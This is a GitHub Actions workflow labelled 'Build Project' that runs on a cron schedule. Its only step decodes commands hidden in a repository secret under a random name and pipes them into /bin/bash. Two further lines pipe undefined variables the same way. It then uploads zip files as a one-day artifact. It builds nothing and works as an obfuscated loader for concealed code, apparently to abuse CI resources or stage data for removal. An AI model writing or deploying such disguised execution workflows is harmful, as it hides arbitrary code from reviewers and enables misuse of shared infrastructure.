name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '46 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Perform
        env:
          unw1: ${{ secrets.unw1 }}
        run: |
          printf '%s' "$unw1" | jq -r .jady43617 | /bin/bash
          echo $aa32206 | jq -r .gvih741 | /bin/bash
          printf '%s' "$cgl64" | jq -r .qud588 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: xM4Jbz4D
          path: "*.zip"
          retention-days: 1
